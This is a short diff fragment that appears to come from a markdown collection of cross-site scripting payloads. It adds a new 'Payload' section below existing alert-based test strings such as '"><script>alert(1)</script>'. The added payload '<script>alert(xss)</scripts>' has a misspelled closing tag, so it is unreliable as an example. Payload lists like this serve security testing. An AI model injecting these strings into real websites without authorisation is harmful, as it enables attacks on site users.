@@ -173,3 +173,11 @@ alert(document.domain);
 "><script>alert(1)</script>
 "/> <script>alert("XSS")</script>
 ```
+
+
+### Payload
+```
+<script>alert(xss)</scripts>
+
+
+```
